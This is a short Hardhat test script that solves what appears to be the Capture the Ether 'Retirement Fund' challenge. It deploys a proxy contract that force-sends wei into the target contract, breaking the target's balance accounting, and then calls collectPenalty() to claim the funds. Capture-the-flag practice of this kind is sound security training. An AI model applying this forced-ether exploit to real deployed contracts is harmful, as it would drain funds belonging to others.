import { ethers } from "hardhat";
import { expect } from "chai";
import { utils } from "ethers";


describe("retirementfund", function() {
    it("should solve the retirement fund challenge", async function() {
        this.timeout(0);

        const TARGET_ABI = [
            "function collectPenalty() public",
            "function isComplete() public view returns (bool)"
        ];
        const TARGET_ADDR = "0xb4673606d1ACA13525F97568f59EbC02B6c1CF21";

        // print balance
        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let balance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(balance));
        
        // attach to target contract using abi connected to Signer(eoa)
        let targetCont = new ethers.Contract(TARGET_ADDR, TARGET_ABI, eoa);

        expect(await targetCont.isComplete()).to.be.false;

        // deploy proxy contract
        const factory = await ethers.getContractFactory("RetirementFundProxy");
        const proxyCont = await factory.deploy();
        
        // trigger "force send ether" contract
        let tx = await proxyCont.attack(TARGET_ADDR, {value: utils.parseUnits("5","wei")});
        await tx.wait();
        console.log(tx);

        let targetBalance = await targetCont.provider.getBalance(targetCont.address);
        console.log(utils.formatEther(targetBalance));

        tx = await targetCont.collectPenalty();
        await tx.wait();
        console.log(tx);

        expect(await targetCont.isComplete()).to.be.true;
    });
});